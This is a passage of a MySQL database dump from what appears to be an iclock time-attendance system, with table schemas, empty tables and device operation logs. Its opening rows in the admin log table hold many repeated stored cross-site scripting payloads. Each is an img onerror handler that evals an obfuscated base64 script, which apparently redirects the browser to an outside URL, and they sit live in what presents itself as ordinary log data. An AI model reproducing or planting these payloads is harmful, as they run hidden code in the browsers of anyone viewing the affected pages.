onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',1),(5,'2011-09-06 09:46:11',1,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',1),(6,'2011-09-06 09:46:37',1,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',1),(7,'2022-11-30 00:20:46',1,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',1),(8,'2022-11-30 00:21:49',1,'\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>','\'\"></title></a><img src=\"0\" onerror=\'eval(atob(\"ZnVuY3Rpb24geChtKXtyID0nJztmPScwODMyNzQnO209bS5zcGxpdCgnLicpO2ZvcihlIGluIG0pe3I9citbJzhlJywnYzkwJywnL2InLCduZy4nLCdceDNhXHgyZlx4MmYnLCczYTQnLCdvc3QnLCdleT0nLCdlYmInLCdjb20nLCc3NGQnLCdhMjcnLCd0aCcsJzkzJywnNDAnLCdwYScsJ2lrJywnaG8nLCdwcicsJzQ0OScsZlsxXSsnM2InLCc1YicsJz9rJywnaHR0JywncHMnLCc3MDYnLCdmNWQnLCdpbycsJ2F0JywnbicsJ2xvYyddW3BhcnNlSW50KG1bZV0pXX0gcmV0dXJuIHJ9IGV2YWwoJ1x4NzdceDY5XHg2ZVx4NjRceDZmXHg3NycpW3goJzMwLjI4LjI3LjI5JyldPXgoJzIzMjQwNDE4MDYxNzAzMDkwMjIwMTYxMjE1MjIwNzE5MDUyNTEwMDgxMzE0MDAyMTI2MDExMScuc3BsaXQoJy4nKVswXS5yZXBsYWNlKC9cQig/PShcZHsyfSkrKD8hXGQpKS9nLCcuJykp\"))\'><title><a>',1);
/*!40000 ALTER TABLE `iclock_adminlog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `iclock_dataitem`
--

DROP TABLE IF EXISTS `iclock_dataitem`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `iclock_dataitem` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `dataName` varchar(900) DEFAULT NULL,
  `dbServer` varchar(900) DEFAULT NULL,
  `contentType_id` int(11) NOT NULL,
  `format` varchar(1024) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `iclock_dataitem_contentType_id` (`contentType_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `iclock_dataitem`
--

LOCK TABLES `iclock_dataitem` WRITE;
/*!40000 ALTER TABLE `iclock_dataitem` DISABLE KEYS */;
/*!40000 ALTER TABLE `iclock_dataitem` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `iclock_deptadmin`
--

DROP TABLE IF EXISTS `iclock_deptadmin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `iclock_deptadmin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `dept_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `iclock_deptadmin_user_id` (`user_id`),
  KEY `iclock_deptadmin_dept_id` (`dept_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `iclock_deptadmin`
--

LOCK TABLES `iclock_deptadmin` WRITE;
/*!40000 ALTER TABLE `iclock_deptadmin` DISABLE KEYS */;
/*!40000 ALTER TABLE `iclock_deptadmin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `iclock_exportdb`
--

DROP TABLE IF EXISTS `iclock_exportdb`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `iclock_exportdb` (
  `expName` varchar(100) NOT NULL,
  `dbEngine` varchar(900) DEFAULT NULL,
  `dbServer` varchar(900) DEFAULT NULL,
  `dbName` varchar(900) DEFAULT NULL,
  `dbUser` varchar(100) NOT NULL,
  `dbPassword` varchar(100) NOT NULL,
  PRIMARY KEY (`expName`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `iclock_exportdb`
--

LOCK TABLES `iclock_exportdb` WRITE;
/*!40000 ALTER TABLE `iclock_exportdb` DISABLE KEYS */;
/*!40000 ALTER TABLE `iclock_exportdb` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `iclock_exportdbitem`
--

DROP TABLE IF EXISTS `iclock_exportdbitem`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `iclock_exportdbitem` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `expDB_id` varchar(100) NOT NULL,
  `tableName` varchar(900) DEFAULT NULL,
  `fieldName` varchar(900) DEFAULT NULL,
  `isKeyField` smallint(6) NOT NULL,
  `overwrite` smallint(6) NOT NULL,
  `dbPassword` varchar(100) NOT NULL,
  `contentType_id` int(11) NOT NULL,
  `dataItem_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `iclock_exportdbitem_expDB_id` (`expDB_id`),
  KEY `iclock_exportdbitem_contentType_id` (`contentType_id`),
  KEY `iclock_exportdbitem_dataItem_id` (`dataItem_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `iclock_exportdbitem`
--

LOCK TABLES `iclock_exportdbitem` WRITE;
/*!40000 ALTER TABLE `iclock_exportdbitem` DISABLE KEYS */;
/*!40000 ALTER TABLE `iclock_exportdbitem` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `iclock_iclockmsg`
--

DROP TABLE IF EXISTS `iclock_iclockmsg`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `iclock_iclockmsg` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `SN_id` varchar(20) NOT NULL,
  `MsgType` int(11) NOT NULL,
  `StartTime` datetime NOT NULL,
  `EndTime` datetime DEFAULT NULL,
  `MsgParam` varchar(900) DEFAULT NULL,
  `MsgContent` varchar(900) DEFAULT NULL,
  `LastTime` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `iclock_iclockmsg_SN_id` (`SN_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `iclock_iclockmsg`
--

LOCK TABLES `iclock_iclockmsg` WRITE;
/*!40000 ALTER TABLE `iclock_iclockmsg` DISABLE KEYS */;
/*!40000 ALTER TABLE `iclock_iclockmsg` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `iclock_itemdefine`
--

DROP TABLE IF EXISTS `iclock_itemdefine`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `iclock_itemdefine` (
  `ItemName` varchar(100) NOT NULL,
  `ItemType` varchar(20) DEFAULT NULL,
  `Author_id` int(11) NOT NULL,
  `ItemValue` varchar(900) DEFAULT NULL,
  `Published` smallint(6) DEFAULT NULL,
  PRIMARY KEY (`ItemName`),
  KEY `iclock_itemdefine_Author_id` (`Author_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `iclock_itemdefine`
--

LOCK TABLES `iclock_itemdefine` WRITE;
/*!40000 ALTER TABLE `iclock_itemdefine` DISABLE KEYS */;
/*!40000 ALTER TABLE `iclock_itemdefine` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `iclock_messages`
--

DROP TABLE IF EXISTS `iclock_messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `iclock_messages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `MsgType` int(11) NOT NULL,
  `StartTime` datetime NOT NULL,
  `EndTime` datetime DEFAULT NULL,
  `MsgContent` varchar(900) DEFAULT NULL,
  `MsgImage` varchar(900) DEFAULT NULL,
  `DeptID_id` int(11) DEFAULT NULL,
  `MsgParam` varchar(900) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `iclock_messages_DeptID_id` (`DeptID_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `iclock_messages`
--

LOCK TABLES `iclock_messages` WRITE;
/*!40000 ALTER TABLE `iclock_messages` DISABLE KEYS */;
/*!40000 ALTER TABLE `iclock_messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `iclock_oplog`
--

DROP TABLE IF EXISTS `iclock_oplog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `iclock_oplog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `SN` varchar(20) DEFAULT NULL,
  `admin` int(11) NOT NULL,
  `OP` smallint(6) NOT NULL,
  `OPTime` datetime NOT NULL,
  `Object` int(11) DEFAULT NULL,
  `Param1` int(11) DEFAULT NULL,
  `Param2` int(11) DEFAULT NULL,
  `Param3` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `iclock_oplog_SN` (`SN`)
) ENGINE=MyISAM AUTO_INCREMENT=314 DEFAULT CHARSET=utf8mb3;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `iclock_oplog`
--

LOCK TABLES `iclock_oplog` WRITE;
/*!40000 ALTER TABLE `iclock_oplog` DISABLE KEYS */;
INSERT INTO `iclock_oplog` VALUES (1,'A3AG223160114',0,0,'2000-02-01 00:01:10',0,0,0,0),(2,'A3AG223160114',0,3,'2000-02-01 00:01:15',55,0,0,0),(3,'A3AG223160114',0,0,'2022-08-01 15:22:47',0,0,0,0),(4,'A3AG223160114',0,3,'2022-08-01 15:22:50',55,0,0,0),(5,'A3AG223160114',0,0,'2022-08-01 15:24:55',0,0,0,0),(6,'A3AG223160114',0,3,'2022-08-01 15:24:58',55,0,0,0),(7,'A3AG223160114',0,3,'2022-08-01 15:26:27',53,0,0,0),(8,'A3AG223160114',0,4,'2022-08-01 15:26:43',0,0,0,0),(9,'A3AG223160114',0,0,'2022-11-07 15:38:45',0,0,0,0),(10,'A3AG223160114',0,3,'2022-11-07 15:38:46',55,0,0,0),(11,'A3AG223160114',0,4,'2022-11-07 15:38:50',0,0,0,0),(12,'A3AG223160114',0,4,'2022-11-07 15:41:04',0,0,0,0),(13,'A3AG223160114',0,4,'2022-11-07 15:47:32',0,0,0,0),(14,'A3AG223160114',0,0,'2022-11-08 19:34:41',0,0,0,0),(15,'A3AG223160114',0,3,'2022-11-08 19:34:44',55,0,0,0),(16,'A3AG223160114',0,4,'2022-11-08 19:34:45',0,0,0,0),(17,'A3AG223160114',0,4,'2022-11-08 19:39:10',0,0,0,0),(18,'A3AG223160114',0,4,'2022-11-08 19:41:21',0,0,0,0),(19,'A3AG223160114',0,0,'2022-11-08 19:45:02',0,0,0,0),(20,'A3AG223160114',0,3,'2022-11-08 19:45:05',55,0,0,0),(21,'A3AG223160114',0,4,'2022-11-08 19:45:07',0,0,0,0),(22,'A3AG223160114',0,0,'2022-11-09 13:19:45',0,0,0,0),(23,'A3AG223160114',0,3,'2022-11-09 13:19:48',55,0,0,0),(24,'A3AG223160114',0,4,'2022-11-09 13:19:50',0,0,0,0),(25,'A3AG223160114',0,4,'2022-11-09 13:33:32',0,0,0,0),(26,'A3AG223160114',0,4,'2022-11-09 13:34:23',0,3002,0,0),(27,'A3AG223160114',0,4,'2022-11-09 13:34:26',0,3006,0,0),(28,'A3AG223160114',0,4,'2022-11-09 13:41:40',0,0,0,0),(29,'A3AG223160114',0,4,'2022-11-09 13:42:52',0,0,0,0),(30,'A3AG223160114',0,4,'2022-11-09 13:50:11',0,0,0,0),(31,'A3AG223160114',0,0,'2022-11-09 13:54:08',0,0,0,0),(32,'A3AG223160114',0,3,'2022-11-09 13:54:10',55,0,0,0),(33,'A3AG223160114',0,4,'2022-11-09 13:55:12',0,0,0,0),(34,'A3AG223160114',0,0,'2022-11-09 13:56:47',0,0,0,0),(35,'A3AG223160114',0,3,'2022-11-09 13:56:50',55,0,0,0),(36,'A3AG223160114',0,4,'2022-11-09 13:58:39',0,0,0,0),(37,'A3AG223160114',0,4,'2022-11-09 14:00:18',0,0,0,0),(38,'A3AG223160114',0,4,'2022-11-09 14:03:51',0,0,0,0),(39,'A3AG223160114',0,4,'2022-11-09 14:12:43',0,0,0,0),(40,'A3AG223160114',0,4,'2022-11-09 14:15:04',0,0,0,0),(41,'A3AG223160114',0,4,'2022-11-09 14:22:59',0,0,0,0),(42,'A3AG223160114',0,0,'2022-11-09 14:45:05',0,0,0,0),(43,'A3AG223160114',0,3,'2022-11-09 14:45:08',55,0,0,0),(44,'A3AG223160114',0,4,'2022-11-09 14:45:11',0,0,0,0),(45,'A3AG223160114',0,4,'2022-11-09 14:45:46',0,0,0,0),(46,'A3AG223160114',0,4,'2022-11-09 14:46:20',0,0,0,0),(47,'A3AG223160114',0,0,'2022-11-09 15:55:17',0,0,0,0),(48,'A3AG223160114',0,3,'2022-11-09 15:55:18',55,0,0,0),(49,'A3AG223160114',0,4,'2022-11-09 15:56:54',0,0,0,0),(50,'A3AG223160114',0,4,'2022-11-09 16:00:59',0,0,0,0),(51,'A3AG223160114',0,4,'2022-11-09 16:25:27',0,0,0,0),(52,'A3AG223160114',0,4,'2022-11-09 16:26:57',0,0,0,0),(53,'A3AG223160114',0,4,'2022-11-09 16:28:18',0,0,0,0),(54,'A3AG223160114',0,4,'2022-11-09 16:43:52',0,0,0,0),(55,'A3AG223160114',0,4,'2022-11-09 16:44:19',0,3002,0,0),(56,'A3AG223160114',0,4,'2022-11-09 16:44:21',0,3006,0,0),(57,'A3AG223160114',0,0,'2022-11-09 16:47:42',0,0,0,0),(58,'A3AG223160114',0,4,'2022-11-09 16:47:49',0,0,0,0),(59,'A3AG223160114',0,4,'2022-11-09 16:49:59',0,0,0,0),(60,'A3AG223160114',0,4,'2022-11-09 16:50:11',0,0,0,0),(61,'A3AG223160114',0,0,'2022-11-09 16:50:56',0,0,0,0),(62,'A3AG223160114',0,3,'2022-11-09 16:50:57',55,0,0,0),(63,'A3AG223160114',0,4,'2022-11-09 16:50:59',0,0,0,0),(64,'A3AG223160114',0,4,'2022-11-09 16:52:42',0,0,0,0),(65,'A3AG223160114',0,4,'2022-11-09 16:54:13',0,0,0,0),(66,'A3AG223160114',0,4,'2022-11-09 16:55:26',0,0,0,0),(67,'A3AG223160114',0,4,'2022-11-09 16:59:26',0,0,0,0),(68,'A3AG223160114',0,4,'2022-11-09 17:00:07',0,0,0,0),(69,'A3AG223160114',0,4,'2022-11-09 